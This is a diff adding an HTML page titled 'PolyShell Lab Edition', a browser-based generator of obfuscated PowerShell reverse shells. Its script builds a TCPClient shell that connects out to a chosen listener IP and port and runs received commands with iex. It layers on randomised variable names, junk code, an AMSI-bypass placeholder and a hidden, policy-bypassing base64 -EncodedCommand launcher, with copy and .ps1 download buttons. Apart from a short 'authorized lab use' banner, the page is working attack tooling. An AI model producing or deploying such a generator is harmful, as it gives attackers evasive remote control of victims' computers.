@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>PolyShell · Lab Edition v2.2</title>
+    <style>
+        /* Same CSS as before - unchanged for brevity */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(145deg, #0a0e1a 0%, #060a12 100%);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #e2e9ff;
+        }
+        .shell-card { max-width: 1180px; width: 100%; background: #111827; border-radius: 24px; border: 1px solid #2a3a5a; box-shadow: 0 25px 60px -10px rgba(0,0,0,0.8); overflow: hidden; }
+        .header { background: #0d1525; padding: 28px 32px; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; border-bottom: 1px solid #1a2a44; }
+        .logo-icon { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #60a5fa, #a78bfa); -webkit-background-clip: text; color: transparent; padding: 8px 16px; border-radius: 12px; border: 1px solid #2a3a5a; background-color: #0a0f1e; }
+        .title { font-size: 2.0rem; font-weight: 700; background: linear-gradient(90deg, #60a5fa, #a78bfa, #f472b6); -webkit-background-clip: text; color: transparent; }
+        .subtitle { font-size: 0.9rem; color: #94a3b8; margin-top: 2px; }
+        .tag { background: #1a2a44; color: #93c5fd; padding: 6px 16px; border-radius: 9999px; font-size: 0.8rem; border: 1px solid #2a4a6a; font-family: 'Fira Code', monospace; }
+        .input-area { padding: 32px; background: #0d1525; }
+        .input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
+        .label { display: block; margin-bottom: 8px; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; color: #94a3b8; font-weight: 600; }
+        input, select { width: 100%; background: #0a0f1e; border: 2px solid #1a2a44; border-radius: 12px; padding: 14px 20px; font-size: 1.1rem; color: white; font-family: 'Fira Code', monospace; }
+        input:focus, select:focus { border-color: #60a5fa; outline: none; box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1); }
+        .controls { display: flex; flex-wrap: wrap; gap: 16px; align-items: center; margin: 20px 0; padding: 16px; background: #0a0f1e; border-radius: 12px; border: 1px solid #1a2a44; }
+        .btn { padding: 12px 28px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; font-size: 0.95rem; }
+        .btn-primary { background: linear-gradient(135deg, #60a5fa, #7c3aed); color: white; }
+        .btn-secondary { background: #1a2a44; color: #e2e9ff; border: 1px solid #2a3a5a; }
+        .btn-success { background: #065f46; color: white; }
+        .output-box { background: #0a0f1e; border-radius: 12px; padding: 20px; margin-top: 16px; border: 1px solid #1a2a44; font-family: 'Fira Code', monospace; font-size: 0.82rem; line-height: 1.6; color: #e0e7ff; white-space: pre-wrap; overflow-x: auto; max-height: 400px; }
+        .warning-box { background: #1a2a1a; border: 1px solid #4a7a4a; border-radius: 12px; padding: 16px; margin: 16px 0; color: #a0d0a0; }
+    </style>
+</head>
+<body>
+<div class="shell-card">
+    <div class="header">
+        <div class="logo-icon">⬡</div>
+        <div>
+            <div class="title">PolyShell</div>
+            <div class="subtitle">Lab Edition v2.2 - Authorized Testing Only</div>
+        </div>
+    </div>
+    <div class="input-area">
+        <div class="warning-box">
+            <strong> AUTHORIZED LAB USE ONLY</strong><br>
+            Isolated environments only. Unauthorized use is illegal.
+        </div>
+
+        <div class="input-row">
+            <div><div class="label">Listener IP</div><input type="text" id="ip" value="192.168.45.217"></div>
+            <div><div class="label">Port</div><input type="text" id="port" value="443"></div>
+        </div>
+
+        <div style="margin-bottom:16px;">
+            <div class="label">Obfuscation Level</div>
+            <select id="obfLevel">
+                <option value="1" selected>Light</option>
+                <option value="2">Medium + Junk</option>
+                <option value="3">Heavy Randomization</option>
+            </select>
+        </div>
+
+        <div class="controls">
+            <label><input type="checkbox" id="b64Mode" checked> Base64 Launcher</label>
+            <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE</label>
+            <label><input type="checkbox" id="amsiBypass"> AMSI Placeholder</label>
+            <label><input type="checkbox" id="junkCode" checked> Add Junk Code</label>
+        </div>
+
+        <div style="display:flex; gap:10px; flex-wrap:wrap;">
+            <button class="btn btn-primary" id="generateBtn">Generate</button>
+            <button class="btn btn-secondary" id="copyLauncherBtn" disabled>Copy Launcher</button>
+            <button class="btn btn-secondary" id="copyReadableBtn" disabled>Copy Readable</button>
+            <button class="btn btn-success" id="downloadPs1Btn" disabled>Download .ps1</button>
+            <button class="btn btn-danger" id="clearBtn">Clear</button>
+        </div>
+    </div>
+
+    <div style="padding:0 32px 20px;">
+        <div class="output-header"><span>Launcher (Copy/Paste)</span></div>
+        <div id="obfuscatedOutput" class="output-box">Click Generate...</div>
+    </div>
+
+    <div style="padding:0 32px 32px;">
+        <div class="output-header"><span>Readable PowerShell</span></div>
+        <div id="decodedOutput" class="output-box">Readable version...</div>
+    </div>
+</div>
+
+<script>
+let generationCounter = 0;
+let currentReadable = '';
+let currentLauncher = '';
+
+function randVar(prefix = '') {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let result = prefix || 'v';
+    for (let i = 0; i < 9; i++) {
+        result += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return result;
+}
+
+function randJunk() {
+    const junk = [
+        `# Lab comment: ${Math.random().toString(36).substring(7)}`,
+        `${randVar()} = $null; # noise`,
+        `Start-Sleep -Milliseconds ${Math.floor(Math.random()*50)};`
+    ];
+    return junk[Math.floor(Math.random() * junk.length)];
+}
+
+function generatePayload(ip, port, obfLevel, useAmsi, useJunk) {
+    const vars = {
+        client: randVar(),
+        stream: randVar(),
+        buffer: randVar(),
+        bytesRead: randVar(),
+        cmd: randVar(),
+        output: randVar()
+    };
+
+    let amsiPart = useAmsi ? `# AMSI placeholder - replace with lab-tested bypass\n` : '';
+
+    let shell = `${amsiPart}
+$${vars.client} = New-Object System.Net.Sockets.TCPClient('${ip}', ${port});
+$${vars.stream} = $${vars.client}.GetStream();
+[byte[]]$${vars.buffer} = 0..65535|%{0};
+while(($${vars.bytesRead} = $${vars.stream}.Read($${vars.buffer}, 0, $${vars.buffer}.Length)) -ne 0){
+    $${vars.cmd} = (New-Object System.Text.ASCIIEncoding).GetString($${vars.buffer},0, $${vars.bytesRead});
+    $${vars.output} = (iex $${vars.cmd} 2>&1 | Out-String);
+    $${vars.output} += "PS " + (pwd).Path + "> ";
+    $${vars.stream}.Write([text.encoding]::ASCII.GetBytes($${vars.output}),0,$${vars.output}.Length);
+    $${vars.stream}.Flush();
+}
+$${vars.client}.Close();`.trim();
+
+    // Add junk code
+    if (useJunk && obfLevel >= 2) {
+        shell = shell.split('\n').map(line => {
+            if (Math.random() > 0.6) return randJunk() + '\n' + line;
+            return line;
+        }).join('\n');
+    }
+
+    // Heavy randomization
+    if (obfLevel >= 3) {
+        shell = shell.replace(/\s+/g, ' ');
+        shell = shell.split(';').join('; ');
+    }
+
+    return shell;
+}
+
+function toUtf16LEBase64(str) {
+    let utf16 = '';
+    for (let i = 0; i < str.length; i++) {
+        utf16 += String.fromCharCode(str.charCodeAt(i)) + '\0';
+    }
+    return btoa(utf16);
+}
+
+const generateBtn = document.getElementById('generateBtn');
+const obfuscatedOutput = document.getElementById('obfuscatedOutput');
+const decodedOutput = document.getElementById('decodedOutput');
+const copyLauncherBtn = document.getElementById('copyLauncherBtn');
+const copyReadableBtn = document.getElementById('copyReadableBtn');
+const downloadPs1Btn = document.getElementById('downloadPs1Btn');
+
+function handleGenerate() {
+    const ip = document.getElementById('ip').value.trim();
+    const port = document.getElementById('port').value.trim();
+    const level = parseInt(document.getElementById('obfLevel').value);
+    const useB64 = document.getElementById('b64Mode').checked;
+    const useUtf16 = document.getElementById('utf16Mode').checked;
+    const useAmsi = document.getElementById('amsiBypass').checked;
+    const useJunk = document.getElementById('junkCode').checked;
+
+    if (!ip || !port) return alert("IP and Port required");
+
+    generationCounter++;
+    let payload = generatePayload(ip, port, level, useAmsi, useJunk);
+    currentReadable = payload;
+
+    let display = payload;
+    if (useB64) {
+        const encoded = useUtf16 ? toUtf16LEBase64(payload) : btoa(unescape(encodeURIComponent(payload)));
+        display = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+    }
+    currentLauncher = display;
+
+    obfuscatedOutput.textContent = display;
+    decodedOutput.textContent = payload;
+
+    copyLauncherBtn.disabled = false;
+    copyReadableBtn.disabled = false;
+    downloadPs1Btn.disabled = false;
+}
+
+function downloadPs1() {
+    if (!currentReadable) return;
+    const blob = new Blob([currentReadable], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `shell_${Date.now()}.ps1`;
+    a.click();
+    URL.revokeObjectURL(url);
+}
+
+// Event listeners
+generateBtn.addEventListener('click', handleGenerate);
+copyLauncherBtn.addEventListener('click', () => navigator.clipboard.writeText(currentLauncher));
+copyReadableBtn.addEventListener('click', () => navigator.clipboard.writeText(currentReadable));
+downloadPs1Btn.addEventListener('click', downloadPs1);
+document.getElementById('clearBtn').addEventListener('click', () => location.reload());
+
+document.addEventListener('DOMContentLoaded', () => setTimeout(handleGenerate, 300));
+</script>
+</body>
+</html>
